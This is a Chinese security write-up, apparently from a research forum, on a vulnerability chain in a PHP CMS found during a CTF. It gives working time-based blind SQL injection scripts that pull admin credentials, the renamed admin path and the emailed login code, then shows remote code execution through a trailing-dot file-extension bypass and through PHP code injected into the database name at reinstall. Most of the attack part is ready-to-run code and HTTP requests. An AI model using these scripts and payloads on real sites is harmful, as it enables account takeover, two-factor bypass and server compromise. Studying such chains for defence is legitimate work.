0.前言
====

最近参加CTF遇到一个CMS，刚好有时间，对其最新版进行一系列漏洞挖掘。

1.前台SQL注入
=========

首先阅读全局配置相关代码，在function/function.php中对各种输入的内容进行了检查，如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5976ab58364d2fe50b8028200fed4666562dab7a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5976ab58364d2fe50b8028200fed4666562dab7a.png)

所有传参方式都进行了过滤，但只对参数值进行了过滤。而在function/form.php中，直接将参数名带入数据库语句进行执行了，如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d332cf3585b9fd733111122946ce3fe192e6db86.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d332cf3585b9fd733111122946ce3fe192e6db86.png)

因此构成注入。

```php
POST //function/form.php?action=input HTTP/1.1
Host: 10.211.55.10:8081
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 14
Content-Type: application/x-www-form-urlencoded

1-sleep(5)=xxx
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d0bf749292ef02705379c1265f16f102179bac82.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d0bf749292ef02705379c1265f16f102179bac82.png)

这部分的漏洞分析其实有前辈先挖掘到了，而且分享出来，但也仅做到此步，而我们的目的不止是验证SQL注入的存在，还要考虑其完整利用方式，于是进行尝试注入数据。

因为CMS的数据库表名是一致的，所以我们可以直接构造payload注入数据。

```php
1-if((select(length(A_pwd))from SL_admin)%3d32,sleep(5),1)=xxx
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-35752014379eeb65163054b2c039b48dc05a3452.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-35752014379eeb65163054b2c039b48dc05a3452.png)

现实却是恒真的表达式却没有延迟，一定是哪里错了。这时候最好的排查方法就是监控数据库的执行记录，如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b421b4083213437476899cb2a080ba6bc1f727e0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b421b4083213437476899cb2a080ba6bc1f727e0.png)

显然我们输入的“空格”被过滤成“下划线”了，那么我们用`/**/`替代即可。从而编写出脚本：

```python
import requests,time

x = [str(x) for x in range(0, 10)]
y = [chr(y) for y in range(97, 123)]
# z = [chr(y) for y in range(65, 90)] # 大写字母
dic = x+y
# function/form.php?action=input
url="http://127.0.0.1/"

""" 注入密码 """

result=''
for i in range(1,33):
    for j in dic:
        data={
            "1-if((select(substr(A_pwd,{},1))from/**/SL_admin)='{}',sleep(5),1)".format(str(i),j):"xxx"
        }
        startTime = time.time()
        res = requests.post(url+'/function/form.php?action=input',data=data)
        endTime = time.time()
        if endTime - startTime > 5:
            result=result+j
            print(str(i)+'[+] '+result)
            break
# select C_admin from SL_config

""" 注入用户名 """
result=''
for x in range(1,30):
    data = {
        "1-if((select(length(A_login))from/**/SL_admin)='{}',sleep(5),1)".format(str(x)):"xxx"
    }
    startTime = time.time()
    res = requests.post(url + '/function/form.php?action=input', data=data)
    endTime = time.time()
    if endTime - startTime > 5:
        print('[+] 用户名长度：' + str(x))
        break

for i in range(1,x+1):
    for j in dic:
        data={
            "1-if((select(substr(A_login,{},1))from/**/SL_admin)='{}',sleep(5),1)".format(str(i),j):"xxx"
        }
        startTime = time.time()
        res = requests.post(url+'/function/form.php?action=input',data=data)
        endTime = time.time()
        if endTime - startTime > 5:
            result=result+j
            print('[+] 用户名：'+result)
            break
```

测试过后，如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-30a46bc18d45a04664e2b8709a38ba9534ee9f74.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-30a46bc18d45a04664e2b8709a38ba9534ee9f74.png)

正当我觉得可以进后台RCE的时候（RCE漏洞见后文），现实环境却给我狠狠的上了一课。

- 注入出账号密码，却找不到后台，因为后台是可以改的。
- 找到后台以后，异地登陆要邮件验证码。

1.1 获取后台地址
----------

通过监控修改后台时执行的SQL语句，发现：后台地址存在在SL\_config表的C\_admin表里面，所以可以通过注入的方式获取后台地址。

```php
import requests,time

x = [str(x) for x in range(0, 10)]
y = [chr(y) for y in range(97, 123)]
# z = [chr(y) for y in range(65, 90)] # 大写字母
dic = x+y

url="http://127.0.0.1/"

# select C_admin from SL_config

""" 注入后台路径 """
result=''
for x in range(1,30):
    data = {
        "1-if((select(length(C_admin))from/**/SL_config)='{}',sleep(5),1)".format(str(x)):"xxx"
    }
    startTime = time.time()
    res = requests.post(url + '/function/form.php?action=input', data=data)
    endTime = time.time()
    if endTime - startTime > 5:
        print('[+] 路径长度：' + str(x))
        break

for i in range(1,x+1):
    for j in dic:
        data={
            "1-if((select(substr(C_admin,{},1))from/**/SL_config)='{}',sleep(5),1)".format(str(i),j):"xxx"
        }
        startTime = time.time()
        res = requests.post(url+'/function/form.php?action=input',data=data)
        endTime = time.time()
        if endTime - startTime > 5:
            result=result+j
            print('[+] 路径：'+result)
            break
```

1.2 邮件验证码
---------

在进行漏洞验证的时候，发现注入出账号密码后，异地IP登陆需要验证码，下面是获取验证码的流程

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7e55a2a872c4cda86b5247c5ad190b376c97a751.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7e55a2a872c4cda86b5247c5ad190b376c97a751.png)

- （1）取出上次管理员登录的IP，如果为空则设置0.0.0.0
- （2）判断账号米啊么是否正确
- （3）检查管理员邮箱是否正确，如果不正确的话，验证码设置为123456
- （4）调用checkip参数判断IP是否与上次登录一致

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2554e9c083604485bbedd65fae5e056029af725b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2554e9c083604485bbedd65fae5e056029af725b.png)

- （5）当IP与上次登录不一致时，判断二次验证是否开启（默认开启）
- （6）然后生成6位随机码，调用sendmail发送给管理员，并将随机码存入SL\_config的C\_test列中。

综上所述，我们可以通过注入SL\_config表的C\_test列，获取验证码，代码如下：

```python
import requests,time

x = [str(x) for x in range(0, 10)]
y = [chr(y) for y in range(97, 123)]
# z = [chr(y) for y in range(65, 90)] # 大写字母
dic = x+y

url="http://127.0.0.1/"

result=''
dic= [str(x) for x in range(0, 10)]
for i in range(1,7):
    for j in dic:
        data={
            "1-if((select(substr(C_test,{},1))from/**/SL_config)='{}',sleep(5),1)".format(str(i),j):"xxx"
        }
        startTime = time.time()
        res = requests.post(url+'/function/form.php?action=input',data=data)
        endTime = time.time()
        if endTime - startTime > 5:
            result=result+j
            print('[+] 验证码：'+result)
            break
```

至此，终于历经千难万险进入到后台中了。接下来看后台RCE。

2.后台RCE
=======

2.1 后台RCE-1修改文件绕过
-----------------

漏洞点在于：admin/ajax.php

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-016dc96137aac9be11f63ef425928b1d6c8e4edc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-016dc96137aac9be11f63ef425928b1d6c8e4edc.png)

在该文件中对修改内容做了几点判断：

- (1)获取后缀名并赋值给$kname
- (2)将POST传入的txt参数进行过滤
- (3)判断$path的文件是否存在
- (4)判断$kname是否合法（核心过滤点）
- (5)然后进行保存

看起来，以上的流程并无漏洞，但是当我们传入的内容为`feed.php.`时，则`$kname`的值变成了空，而对空值进`preg_match('/asp|php|apsx|asax|ascx|cdx|cer|cgi|json|jsp/i', $kname)`的判断，则一定为`False`，因此可以绕过核心过滤点。

实践如下：直接修改，会现实不允许保存该格式文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-58fef286a427ad550df9a68cfc21065a0563448e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-58fef286a427ad550df9a68cfc21065a0563448e.png)

绕过：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f8ad2c364a250a93a7f3c3a09664b63744797fb1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f8ad2c364a250a93a7f3c3a09664b63744797fb1.png)

尝试webshell：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-575715b72828f3ea96c6551411e349ec1d151b01.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-575715b72828f3ea96c6551411e349ec1d151b01.png)

2.2 后台RCE之重装CMS覆盖配置文件
---------------------

在这个CMS一直都有一个重装getshell的方法，我们先看下触发重装的方法是什么：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c217ab30a2abd5874b2bceab6e8482844e712e2f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c217ab30a2abd5874b2bceab6e8482844e712e2f.png)

然而，我们可以通过2.2中分析的漏洞，修改config.json的内容，数据包为：

```php
POST /admin/ajax.php?type=savetxt&path=/data/config.json. HTTP/1.1
Host: 10.211.55.10:8082
Content-Length: 185
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.211.55.10:8082
Referer: http://10.211.55.10:8082/admin/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: count_all=0; authx=; userx=; passx=; add=%E4%B8%AD%E5%9B%BD; user=admin; pass=c5a896f598dd81826b6043bcc3c7cfe9; A_type=1; auth=1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1; newsauth=all; productauth=all; textauth=all; formauth=all; bbsauth=all; PHPSESSID=bmpa9h5omv0mkjphlelkkvqc12; Hm_lvt_b60316de6009d5654de7312f772162be=1626009231,1626661445; Hm_lpvt_b60316de6009d5654de7312f772162be=1626665207
Connection: close

txt={"first"%3a"1","table"%3a"SL_","template"%3a"true","plug"%3a"true","from"%3a"free","url"%3a"https%3a\/\/www.s-cms.cn","id"%3a"0","https"%3a"false","api"%3a"http%3a\/\/cdn.s-cms.cn"}
```

如果这里不想危害网站，或者说有个更好的还原，请将txt的值改为访问data/config.json后的值(web可访问到)，值修改first=1

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0619f7100384d603dff159ab5a6b1718f29297b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0619f7100384d603dff159ab5a6b1718f29297b.png)

然后进行重装，在数据库名称输入：`test#");phpinfo();#` ，即可getshell。我们看下是怎么形成的：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8994938ca9b42a63ff942733710f85b27f01d9ac.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8994938ca9b42a63ff942733710f85b27f01d9ac.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2b5e0161dbb4af9823440a74b59cb892a6ad6c2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2b5e0161dbb4af9823440a74b59cb892a6ad6c2b.png)

进行一系列的导入后，将数据库账号密码等信息保存到function/conn.php

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bedbf6c581bf5e89bc8ff94579a282ee3300b7b8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bedbf6c581bf5e89bc8ff94579a282ee3300b7b8.png)

所以形成RCE：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c872043df3c603236a8922de499683a4fc28f27b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c872043df3c603236a8922de499683a4fc28f27b.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dff7a25da00d79d5622a2f69b63ee300b94726ac.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dff7a25da00d79d5622a2f69b63ee300b94726ac.png)

3.总结
====

1、is\_file 在windows环境下对`1.php.`判断是否存在时，会自动去掉最后的`.`。

2、试用`1.php.`方式进行黑名单绕过，其实在某大OA里面也出现过，可能算是黑名单校验的通病吧，只校验是否存在黑名单字符，而忘记校验后缀是否为空。

3、其实从这个注入也是想到了很多骚思路，以后注入出的密码无法解密到明文的时候，可以考虑密码重置，从数据库读验证码。